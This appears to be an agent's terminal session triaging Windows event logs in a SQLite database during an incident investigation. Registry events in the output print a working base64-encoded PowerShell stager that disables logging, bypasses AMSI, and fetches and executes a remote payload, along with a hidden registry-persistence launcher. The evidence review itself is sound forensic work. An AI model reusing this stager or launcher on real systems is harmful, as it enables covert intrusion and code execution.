-('evt-00587', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00588', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00589', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00590', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00591', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00592', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00593', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00594', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00595', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00603', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00604', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00609', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00611', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00612', 'WS-05.corp.example', '', 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', '', '', '{b59756a9-b239-5f17-5307-000000000400}')
-('evt-00616', 'WS-05.corp.example', 'CORP\\pgustavo', 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', '', '', '{b59756a9-b239-5f17-5307-000000000400}')
-('evt-00637', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00638', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00639', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00640', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00641', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00642', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00643', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00644', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00645', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00646', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00647', 'WS-05.corp.example', '', 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', '', '', '{b59756a9-b239-5f17-5307-000000000400}')
-('evt-00648', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00649', 'WS-05.corp.example', '', '', '', '', None)
-('evt-00650', 'WS-05.corp.example', '', '', '', '', None)
-[?2004hroot@330dbb2b3463:~# cat << 'EOF' > /tmp/guid_check.py
-[?2004l[?2004h> import sqlite3
-[?2004l[?2004h> 
-[?2004l[?2004h> conn = sqlite3.connect('/root/data/eventlogs.db')
-[?2004l[?2004h> cursor = conn.cursor()
-[?2004l[?2004h> 
-[?2004l[?2004h> # Find all events associated with process_guid {b59756a9-b239-5f17-5307-000000000400}
-[?2004l[?2004h> cursor.execute("""
-[?2004l[?2004h>     SELECT event_id, event_code, timestamp, channel, user, image, parent_image, command_line, dst_ip, dst_port, details, message 
-[?2004l[?2004h>     FROM events 
-[?2004l[?2004h>     WHERE process_guid = '{b59756a9-b239-5f17-5307-000000000400}'
-[?2004l[?2004h> """)
-[?2004l[?2004h> rows = cursor.fetchall()
-[?2004l[?2004h> print(f"Found {len(rows)} events for process_guid {{b59756a9-b239-5f17-5307-000000000400}}")
-[?2004l[?2004h> for r in rows:
-[?2004l[?2004h>     # Avoid printing huge messages unless needed, show general info first
-[?2004l[?2004h>     print(f"ID: {r[0]} | Code: {r[1]} | Time: {r[2]} | User: {r[4]} | Image: {r[5]} | Cmd: {r[7][:100]} | Dst: {r[8]}:{r[9]} | Details: {r[10]}")
-[?2004l[?2004h> 
-[?2004l[?2004h> EOF
-[?2004l[?2004hroot@330dbb2b3463:~# python3 /tmp/guid_check.py
-[?2004lFound 23 events for process_guid {b59756a9-b239-5f17-5307-000000000400}
-ID: evt-00034 | Code: 12 | Time: 2026-05-06T00:00:03.020Z | User:  | Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | Cmd:  | Dst: None:None | Details: 
-ID: evt-00088 | Code: 3 | Time: 2026-05-06T00:00:05.040Z | User: CORP\pgustavo | Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | Cmd:  | Dst: 10.10.10.5:80 | Details: 
-ID: evt-00110 | Code: 12 | Time: 2026-05-06T00:00:06.053Z | User:  | Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | Cmd:  | Dst: None:None | Details: 
-ID: evt-00129 | Code: 3 | Time: 2026-05-06T00:00:08.065Z | User: CORP\pgustavo | Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | Cmd:  | Dst: 10.10.10.5:80 | Details: 
-ID: evt-00190 | Code: 12 | Time: 2026-05-06T00:00:12.101Z | User:  | Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | Cmd:  | Dst: None:None | Details: 
-ID: evt-00195 | Code: 3 | Time: 2026-05-06T00:00:13.115Z | User: CORP\pgustavo | Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | Cmd:  | Dst: 10.10.10.5:80 | Details: 
-ID: evt-00282 | Code: 12 | Time: 2026-05-06T00:00:17.150Z | User:  | Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | Cmd:  | Dst: None:None | Details: 
-ID: evt-00286 | Code: 13 | Time: 2026-05-06T00:00:17.152Z | User:  | Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | Cmd:  | Dst: None:None | Details: SQBmACgAJABQAFMAVgBlAHIAcwBpAE8AbgBUAEEAQgBMAEUALgBQAFMAVgBFAFIAcwBpAE8ATgAuAE0AYQBqAE8AcgAgAC0ARwBFACAAMwApAHsAJAA1ADcAQQBmADAAPQBbAFIARQBmAF0ALgBBAHMAcwBlAG0AQgBsAFkALgBHAEUAVABUAFkAcABlACgAJwBTAHkAcwB0AGUAbQAuAE0AYQBuAGEAZwBlAG0AZQBuAHQALgBBAHUAdABvAG0AYQB0AGkAbwBuAC4AVQB0AGkAbABzACcAKQAuACIARwBFAHQARgBJAGUAYABMAGQAIgAoACcAYwBhAGMAaABlAGQARwByAG8AdQBwAFAAbwBsAGkAYwB5AFMAZQB0AHQAaQBuAGcAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQA7AEkARgAoACQANQA3AGEARgAwACkAewAkADQAOABBAGMANgA9ACQANQA3AGEAZgAwAC4ARwBlAFQAVgBhAGwAVQBFACgAJABuAFUAbABMACkAOwBJAGYAKAAkADQAOABhAEMANgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdACkAewAkADQAOABBAGMANgBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJAA0ADgAQQBjADYAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0AJAB2AGEAbAA9AFsAQwBvAGwATABFAEMAVABJAE8AbgBTAC4ARwBlAG4AZQByAEkAYwAuAEQAaQBDAHQAaQBPAE4AYQBSAFkAWwBzAFQAUgBpAG4ARwAsAFMAeQBTAFQARQBNAC4ATwBCAEoAZQBDAFQAXQBdADoAOgBOAEUAVwAoACkAOwAkAHYAQQBMAC4AQQBkAEQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAHYAYQBMAC4AQQBEAGQAKAAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwAsADAAKQA7ACQANAA4AEEAQwA2AFsAJwBIAEsARQBZAF8ATABPAEMAQQBMAF8ATQBBAEMASABJAE4ARQBcAFMAbwBmAHQAdwBhAHIAZQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwBcAFAAbwB3AGUAcgBTAGgAZQBsAGwAXABTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAkAHYAQQBsAH0ARQBsAHMAZQB7AFsAUwBDAFIAaQBQAFQAQgBsAG8AYwBrAF0ALgAiAEcAZQBUAEYAaQBFAGAAbABEACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAdABWAEEAbAB1AGUAKAAkAG4AdQBMAEwALAAoAE4AZQB3AC0ATwBiAGoAZQBDAFQAIABDAE8ATABMAEUAYwBUAGkAbwBuAFMALgBHAEUAbgBlAHIASQBDAC4ASABhAHMASABTAGUAVABbAFMAVAByAGkAbgBHAF0AKQApAH0AJABSAGUARgA9AFsAUgBlAEYAXQAuAEEAcwBTAEUATQBiAGwAWQAuAEcARQBUAFQAeQBQAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBBAG0AcwBpACcAKwAnAFUAdABpAGwAcwAnACkAOwAkAFIAZQBGAC4ARwBlAHQARgBpAGUAbABEACgAJwBhAG0AcwBpAEkAbgBpAHQARgAnACsAJwBhAGkAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAEUAVABWAEEATAB1AEUAKAAkAG4AVQBsAGwALAAkAFQAUgB1AEUAKQA7AH0AOwBbAFMAeQBzAFQAZQBNAC4ATgBFAFQALgBTAEUAUgBWAGkAQwBlAFAATwBJAE4AdABNAGEATgBBAEcAZQBSAF0AOgA6AEUAeABwAGUAYwB0ADEAMAAwAEMATwBOAFQASQBOAFUARQA9ADAAOwAkAEEAOQA0ADgANgA9AE4ARQBXAC0ATwBCAGoAZQBjAHQAIABTAHkAcwBUAGUAbQAuAE4ARQBUAC4AVwBFAGIAQwBMAGkAZQBOAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJABzAGUAcgA9ACQAKABbAFQARQBYAHQALgBFAG4AQwBPAGQASQBuAEcAXQA6ADoAVQBOAEkAYwBvAGQAZQAuAEcAZQB0AFMAVAByAGkAbgBnACgAWwBDAG8ATgBWAEUAUgB0AF0AOgA6AEYAUgBvAG0AQgBBAHMARQA2ADQAUwB0AHIASQBOAGcAKAAnAGEAQQBCADAAQQBIAFEAQQBjAEEAQQA2AEEAQwA4AEEATAB3AEEAeABBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATABnAEEAMQBBAEQAbwBBAE8AQQBBAHcAQQBBAD0APQAnACkAKQApADsAJAB0AD0AJwAvAGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnADsAJABhADkANAA4ADYALgBIAGUAQQBkAEUAUgBTAC4AQQBEAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJABBADkANAA4ADYALgBQAHIAbwBYAFkAPQBbAFMAWQBTAFQARQBNAC4ATgBFAFQALgBXAEUAYgBSAEUAUQB1AEUAcwBUAF0AOgA6AEQARQBmAGEAdQBsAHQAVwBFAGIAUAByAG8AWABZADsAJABhADkANAA4ADYALgBQAHIATwBYAHkALgBDAHIARQBEAEUAbgBUAEkAYQBsAFMAIAA9ACAAWwBTAFkAUwBUAGUAbQAuAE4AZQBUAC4AQwBSAGUARABFAE4AdABJAGEAbABDAGEAQwBoAEUAXQA6ADoARABFAGYAYQBVAEwAdABOAEUAVABXAG8AUgBrAEMAcgBlAEQAZQBuAHQASQBhAGwAcwA7ACQAUwBjAHIAaQBwAHQAOgBQAHIAbwB4AHkAIAA9ACAAJABhADkANAA4ADYALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAWQBTAHQARQBNAC4AVABFAHgAVAAuAEUAbgBDAG8ARABJAE4ARwBdADoAOgBBAFMAQwBJAEkALgBHAEUAVABCAFkAVABFAFMAKAAnADkAbABLAE0ATAAlAFQAQwAuAGoAbwA1AEgAQAA6AD8APgAwAG4AdQB2AFcAUwBlACoAYgBGAEkAfQBdAEUAQQAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQBSAGcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMATwB1AG4AVABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBCAFgAbwByACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAGEAOQA0ADgANgAuAEgAZQBBAGQAZQByAFMALgBBAEQAZAAoACIAQwBvAG8AawBpAGUAIgAsACIASABDAHAATwBBAGMAbQBHAGQASQBPAEsAZwA9AE8AdgBQAHYAYgB5AG0AZAAwAGIAVgBnAE0AUABxADQAZQA4AGIANABVAEcAMwBXAEsAbQBNAD0AIgApADsAJABkAEEAVABBAD0AJABBADkANAA4ADYALgBEAG8AdwBuAEwATwBBAGQARABBAFQAYQAoACQAcwBFAFIAKwAkAHQAKQA7ACQASQBWAD0AJABkAGEAdABhAFsAMAAuAC4AMwBdADsAJABEAEEAVABhAD0AJABEAEEAVABBAFsANAAuAC4AJABkAGEAVABBAC4AbABlAE4ARwB0AEgAXQA7AC0AagBPAGkAbgBbAEMASABhAHIAWwBdAF0AKAAmACAAJABSACAAJABkAGEAVABhACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA=
-ID: evt-00289 | Code: 13 | Time: 2026-05-06T00:00:17.152Z | User:  | Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | Cmd:  | Dst: None:None | Details: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c "$x=$((gp HKLM:SOFTWARE\Microsoft\Windows\CurrentVersion Debug).Debug);powershell -Win Hidden -enc $x"
-ID: evt-00290 | Code: 12 | Time: 2026-05-06T00:00:17.153Z | User:  | Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | Cmd:  | Dst: None:None | Details: 
-ID: evt-00427 | Code: 3 | Time: 2026-05-06T00:00:20.199Z | User: CORP\pgustavo | Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | Cmd:  | Dst: 10.10.10.5:80 | Details: 
-ID: evt-00428 | Code: 3 | Time: 2026-05-06T00:00:20.199Z | User: CORP\pgustavo | Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | Cmd:  | Dst: 10.10.10.5:80 | Details: 
-ID: evt-00453 | Code: 12 | Time: 2026-05-06T00:00:23.231Z | User:  | Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | Cmd:  | Dst: None:None | Details: 
-ID: evt-00468 | Code: 3 | Time: 2026-05-06T00:00:25.255Z | User: CORP\pgustavo | Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | Cmd:  | Dst: 10.10.10.5:80 | Details: 
-ID: evt-00493 | Code: 12 | Time: 2026-05-06T00:00:28.260Z | User:  | Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | Cmd:  | Dst: None:None | Details: 
-ID: evt-00497 | Code: 3 | Time: 2026-05-06T00:00:30.274Z | User: CORP\pgustavo | Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | Cmd:  | Dst: 10.10.10.5:80 | Details: 
-ID: evt-00518 | Code: 12 | Time: 2026-05-06T00:00:33.305Z | User:  | Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | Cmd:  | Dst: None:None | Details: 
-ID: evt-00529 | Code: 3 | Time: 2026-05-06T00:00:35.321Z | User: CORP\pgustavo | Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | Cmd:  | Dst: 10.10.10.5:80 | Details: 
-ID: evt-00565 | Code: 12 | Time: 2026-05-06T00:00:39.332Z | User:  | Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | Cmd:  | Dst: None:None | Details: 
-ID: evt-00580 | Code: 3 | Time: 2026-05-06T00:00:40.339Z | User: CORP\pgustavo | Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | Cmd:  | Dst: 10.10.10.5:80 | Details: 
-ID: evt-00612 | Code: 12 | Time: 2026-05-06T00:00:44.372Z | User:  | Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | Cmd:  | Dst: None:None | Details: 
-ID: evt-00616 | Code: 3 | Time: 2026-05-06T00:00:45.371Z | User: CORP\pgustavo | Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | Cmd:  | Dst: 10.10.10.5:80 | Details: 
-ID: evt-00647 | Code: 12 | Time: 2026-05-06T00:00:48.378Z | User:  | Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe | Cmd:  | Dst: None:None | Details: 
-[?2004hroot@330dbb2b3463:~# cat << 'EOF' > /tmp/search_other.py
-[?2004l[?2004h> import sqlite3
-[?2004l[?2004h> 
-[?2004l[?2004h> conn = sqlite3.connect('/root/data/eventlogs.db')
-[?2004l[?2004h> cursor = conn.cursor()
-[?2004l[?2004h> 
-[?2004l[?2004h> # Let's inspect events on DC01 and WS-06 first, filtering for non-standard events or system events
-[?2004l[?2004h> # Wait, let's see how many events are on WS-06 and DC01
-[?2004l[?2004h> cursor.execute("SELECT host, COUNT(*) FROM events GROUP BY host")
-[?2004l[?2004h> print("Host event counts:", cursor.fetchall())
-[?2004l[?2004h> 
-[?2004l[?2004h> print("\n--- Events on DC01 ---")
-[?2004l[?2004h> cursor.execute("""
-[?2004l[?2004h>     SELECT event_id, event_code, timestamp, user, image, parent_image, command_line, details, message 
-[?2004l[?2004h>     FROM events 
-[?2004l[?2004h>     WHERE host = 'DC01.corp.example' 
-[?2004l[?2004h>     ORDER BY timestamp
-[?2004l[?2004h> """)
-[?2004l[?2004h> for r in cursor.fetchall()[:50]:
-[?2004l[?2004h>     print(f"ID: {r[0]} | Code: {r[1]} | Time: {r[2]} | User: {r[3]} | Image: {r[4]} | Parent: {r[5]} | Cmd: {r[6]} | Details: {r[7][:100]}")
-[?2004l[?2004h> 
-[?2004l[?2004h> print("\n--- Events on WS-06 ---")
-[?2004l[?2004h> cursor.execute("""
-[?2004l[?2004h>     SELECT event_id, event_code, timestamp, user, image, parent_image, command_line, details, message 
-[?2004l[?2004h>     FROM events 
-[?2004l[?2004h>     WHERE host = 'WS-06.corp.example' 
-[?2004l[?2004h>     ORDER BY timestamp
-[?2004l[?2004h> """)
-[?2004l[?2004h> for r in cursor.fetchall()[:50]:
-[?2004l[?2004h>     print(f"ID: {r[0]} | Code: {r[1]} | Time: {r[2]} | User: {r[3]} | Image: {r[4]} | Parent: {r[5]} | Cmd: {r[6]} | Details: {r[7][:100]}")
-[?2004l[?2004h> 
-[?2004l[?2004h> EOF
-[?2004l[?2004hroot@330dbb2b3463:~# python3 /tmp/search_other.py
-[?2004lHost event counts: [('DC01.corp.example', 282), ('WS-05.corp.example', 349), ('WS-06.corp.example', 26)]
-
---- Events on DC01 ---
-ID: evt-00001 | Code: 5156 | Time: 2026-05-06T00:00:00.000Z | User:  | Image:  | Parent:  | Cmd:  | Details: 
-ID: evt-00002 | Code: 5156 | Time: 2026-05-06T00:00:00.000Z | User:  | Image:  | Parent:  | Cmd:  | Details: 
-ID: evt-00003 | Code: 5156 | Time: 2026-05-06T00:00:00.000Z | User:  | Image:  | Parent:  | Cmd:  | Details: 
-ID: evt-00004 | Code: 5156 | Time: 2026-05-06T00:00:00.000Z | User:  | Image:  | Parent:  | Cmd:  | Details: 
-ID: evt-00005 | Code: 5156 | Time: 2026-05-06T00:00:00.000Z | User:  | Image:  | Parent:  | Cmd:  | Details: 
-ID: evt-00006 | Code: 5156 | Time: 2026-05-06T00:00:00.000Z | User:  | Image:  | Parent:  | Cmd:  | Details: 
-ID: evt-00007 | Code: 5156 | Time: 2026-05-06T00:00:00.000Z | User:  | Image:  | Parent:  | Cmd:  | Details: 
-ID: evt-00008 | Code: 5156 | Time: 2026-05-06T00:00:00.001Z | User:  | Image:  | Parent:  | Cmd:  | Details: 
-ID: evt-00009 | Code: 5156 | Time: 2026-05-06T00:00:00.001Z | User:  | Image:  | Parent:  | Cmd:  | Details: 
-ID: evt-00010 | Code: 5156 | Time: 2026-05-06T00:00:00.001Z | User:  | Image:  | Parent:  | Cmd:  | Details: 
-ID: evt-00011 | Code: 5156 | Time: 2026-05-06T00:00:00.001Z | User:  | Image:  | Parent:  | Cmd:  | Details: 
-ID: evt-00012 | Code: 5156 | Time: 2026-05-06T00:00:00.001Z | User:  | Image:  | Parent:  | Cmd:  | Details: 
-ID: evt-00013 | Code: 5156 | Time: 2026-05-06T00:00:00.002Z | User:  | Image:  | Parent:  | Cmd:  | Details: 
-ID: evt-00014 | Code: 5156 | Time: 2026-05-06T00:00:00.002Z | User:  | Image:  | Parent:  | Cmd:  | Details: 
-ID: evt-00015 | Code: 5156 | Time: 2026-05-06T00:00:00.002Z | User:  | Image:  | Parent:  | Cmd:  | Details: 
-ID: evt-00016 | Code: 5156 | Time: 2026-05-06T00:00:00.002Z | User:  | Image:  | Parent:  | Cmd:  | Details: 
-ID: evt-00017 | Code: 5156 | Time: 2026-05-06T00:00:01.015Z | User:  | Image:  | Parent:  | Cmd:  | Details: 
-ID: evt-00018 | Code: 5156 | Time: 2026-05-06T00:00:01.015Z | User:  | Image:  | Parent:  | Cmd:  | Details: 
-ID: evt-00028 | Code: 3 | Time: 2026-05-06T00:00:02.018Z | User: NT AUTHORITY\SYSTEM | Image: C:\Windows\System32\dns.exe | Parent:  | Cmd:  | Details: 
-ID: evt-00029 | Code: 3 | Time: 2026-05-06T00:00:02.018Z | User: NT AUTHORITY\SYSTEM | Image: C:\Windows\System32\dns.exe | Parent:  | Cmd:  | Details: 
-ID: evt-00035 | Code: 5156 | Time: 2026-05-06T00:00:03.020Z | User:  | Image:  | Parent:  | Cmd:  | Details: 
-ID: evt-00036 | Code: 5156 | Time: 2026-05-06T00:00:03.020Z | User:  | Image:  | Parent:  | Cmd:  | Details: 
-ID: evt-00037 | Code: 5156 | Time: 2026-05-06T00:00:03.020Z | User:  | Image:  | Parent:  | Cmd:  | Details: 
-ID: evt-00038 | Code: 5156 | Time: 2026-05-06T00:00:03.020Z | User:  | Image:  | Parent:  | Cmd:  | Details: 
-ID: evt-00039 | Code: 4624 | Time: 2026-05-06T00:00:03.020Z | User: - | Image:  | Parent:  | Cmd:  | Details: 
-ID: evt-00040 | Code: 4627 | Time: 2026-05-06T00:00:03.020Z | User: - | Image:  | Parent:  | Cmd:  | Details: 
-ID: evt-00041 | Code: 5140 | Time: 2026-05-06T00:00:03.021Z | User: WEC$ | Image:  | Parent:  | Cmd:  | Details: 
-ID: evt-00042 | Code: 5145 | Time: 2026-05-06T00:00:03.021Z | User: WEC$ | Image:  | Parent:  | Cmd:  | Details: 
-ID: evt-00043 | Code: 4661 | Time: 2026-05-06T00:00:03.021Z | User: WEC$ | Image:  | Parent:  | Cmd:  | Details: 
-ID: evt-00044 | Code: 4661 | Time: 2026-05-06T00:00:03.021Z | User: WEC$ | Image:  | Parent:  | Cmd:  | Details: 
-ID: evt-00045 | Code: 4658 | Time: 2026-05-06T00:00:03.021Z | User: WEC$ | Image:  | Parent:  | Cmd:  | Details: 
-ID: evt-00046 | Code: 4658 | Time: 2026-05-06T00:00:03.021Z | User: WEC$ | Image:  | Parent:  | Cmd:  | Details: 
-ID: evt-00047 | Code: 5145 | Time: 2026-05-06T00:00:03.021Z | User: WEC$ | Image:  | Parent:  | Cmd:  | Details: 
-ID: evt-00048 | Code: 4661 | Time: 2026-05-06T00:00:03.022Z | User: WEC$ | Image:  | Parent:  | Cmd:  | Details: 
-ID: evt-00049 | Code: 4661 | Time: 2026-05-06T00:00:03.022Z | User: WEC$ | Image:  | Parent:  | Cmd:  | Details: 
-ID: evt-00050 | Code: 4658 | Time: 2026-05-06T00:00:03.022Z | User: WEC$ | Image:  | Parent:  | Cmd:  | Details: 
-ID: evt-00051 | Code: 4658 | Time: 2026-05-06T00:00:03.022Z | User: WEC$ | Image:  | Parent:  | Cmd:  | Details: 
-ID: evt-00052 | Code: 5145 | Time: 2026-05-06T00:00:03.023Z | User: WEC$ | Image:  | Parent:  | Cmd:  | Details: 
-ID: evt-00053 | Code: 5156 | Time: 2026-05-06T00:00:03.023Z | User:  | Image:  | Parent:  | Cmd:  | Details: 
-ID: evt-00054 | Code: 5156 | Time: 2026-05-06T00:00:03.023Z | User:  | Image:  | Parent:  | Cmd:  | Details: 
-ID: evt-00055 | Code: 5156 | Time: 2026-05-06T00:00:03.023Z | User:  | Image:  | Parent:  | Cmd:  | Details: 
-ID: evt-00056 | Code: 5156 | Time: 2026-05-06T00:00:03.023Z | User:  | Image:  | Parent:  | Cmd:  | Details: 
-ID: evt-00057 | Code: 5156 | Time: 2026-05-06T00:00:03.023Z | User:  | Image:  | Parent:  | Cmd:  | Details: 
-ID: evt-00058 | Code: 5156 | Time: 2026-05-06T00:00:03.024Z | User:  | Image:  | Parent:  | Cmd:  | Details: 
-ID: evt-00059 | Code: 5156 | Time: 2026-05-06T00:00:03.024Z | User:  | Image:  | Parent:  | Cmd:  | Details: 
-ID: evt-00060 | Code: 5156 | Time: 2026-05-06T00:00:03.024Z | User:  | Image:  | Parent:  | Cmd:  | Details: 
-ID: evt-00061 | Code: 5156 | Time: 2026-05-06T00:00:03.024Z | User:  | Image:  | Parent:  | Cmd:  | Details: 
-ID: evt-00062 | Code: 5156 | Time: 2026-05-06T00:00:03.024Z | User:  | Image:  | Parent:  | Cmd:  | Details: 
-ID: evt-00063 | Code: 4624 | Time: 2026-05-06T00:00:03.025Z | User: - | Image:  | Parent:  | Cmd:  | Details: 
-ID: evt-00064 | Code: 4627 | Time: 2026-05-06T00:00:03.025Z | User: - | Image:  | Parent:  | Cmd:  | Details: 
-
---- Events on WS-06 ---
-ID: evt-00196 | Code: 10 | Time: 2026-05-06T00:00:13.115Z | User:  | Image: C:\windows\system32\svchost.exe | Parent:  | Cmd:  | Details: 
-ID: evt-00198 | Code: 10 | Time: 2026-05-06T00:00:13.116Z | User:  | Image: C:\windows\system32\svchost.exe | Parent:  | Cmd:  | Details: 
-ID: evt-00200 | Code: 10 | Time: 2026-05-06T00:00:13.117Z | User:  | Image: C:\windows\system32\svchost.exe | Parent:  | Cmd:  | Details: 
-ID: evt-00202 | Code: 10 | Time: 2026-05-06T00:00:13.117Z | User:  | Image: C:\windows\system32\svchost.exe | Parent:  | Cmd:  | Details: 
-ID: evt-00205 | Code: 10 | Time: 2026-05-06T00:00:13.118Z | User:  | Image: C:\windows\system32\svchost.exe | Parent:  | Cmd:  | Details: 
-ID: evt-00207 | Code: 10 | Time: 2026-05-06T00:00:13.119Z | User:  | Image: C:\windows\system32\svchost.exe | Parent:  | Cmd:  | Details: 
-ID: evt-00208 | Code: 10 | Time: 2026-05-06T00:00:13.119Z | User:  | Image: C:\windows\system32\svchost.exe | Parent:  | Cmd:  | Details: 
-ID: evt-00210 | Code: 10 | Time: 2026-05-06T00:00:13.120Z | User:  | Image: C:\windows\system32\svchost.exe | Parent:  | Cmd:  | Details: 
-ID: evt-00212 | Code: 10 | Time: 2026-05-06T00:00:13.120Z | User:  | Image: C:\windows\system32\svchost.exe | Parent:  | Cmd:  | Details: 
-ID: evt-00213 | Code: 10 | Time: 2026-05-06T00:00:13.121Z | User:  | Image: C:\windows\system32\svchost.exe | Parent:  | Cmd:  | Details: 
-ID: evt-00216 | Code: 10 | Time: 2026-05-06T00:00:13.122Z | User:  | Image: C:\windows\system32\svchost.exe | Parent:  | Cmd:  | Details: 
-ID: evt-00220 | Code: 10 | Time: 2026-05-06T00:00:13.123Z | User:  | Image: C:\windows\system32\svchost.exe | Parent:  | Cmd:  | Details: 
-ID: evt-00222 | Code: 10 | Time: 2026-05-06T00:00:13.123Z | User:  | Image: C:\windows\system32\svchost.exe | Parent:  | Cmd:  | Details: 
-ID: evt-00224 | Code: 12 | Time: 2026-05-06T00:00:13.124Z | User:  | Image: C:\windows\System32\svchost.exe | Parent:  | Cmd:  | Details: 
-ID: evt-00226 | Code: 13 | Time: 2026-05-06T00:00:13.125Z | User:  | Image: C:\windows\System32\svchost.exe | Parent:  | Cmd:  | Details: QWORD (0x01d65fdf-0x39703e82)
